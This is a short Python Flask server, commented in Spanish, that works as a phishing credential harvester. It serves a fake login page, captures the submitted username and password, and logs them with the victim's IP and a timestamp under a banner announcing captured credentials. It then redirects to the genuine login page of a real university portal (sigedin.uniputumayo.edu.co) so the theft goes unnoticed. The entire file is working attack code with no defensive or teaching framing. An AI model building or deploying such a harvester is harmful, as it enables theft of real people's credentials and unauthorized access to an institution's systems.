from flask import Flask, request, redirect, send_from_directory
import datetime
import os

app = Flask(__name__)

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/', methods=['POST'])
def capturar_credenciales():
    usuario = request.form.get('usuario', '')
    clave = request.form.get('clave', '')
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # El parámetro flush=True fuerza a que aparezca en los logs de Render al instante
    print("\n" + "="*60, flush=True)
    print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨", flush=True)
    print(f"📅 Fecha y Hora: {fecha}", flush=True)
    print(f"🌐 IP de la Víctima: {ip}", flush=True)
    print(f"👤 Usuario / Documento: {usuario}", flush=True)
    print(f"🔑 Contraseña: {clave}", flush=True)
    print("="*60 + "\n", flush=True)
    
    return redirect('https://sigedin.uniputumayo.edu.co/login', code=302)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)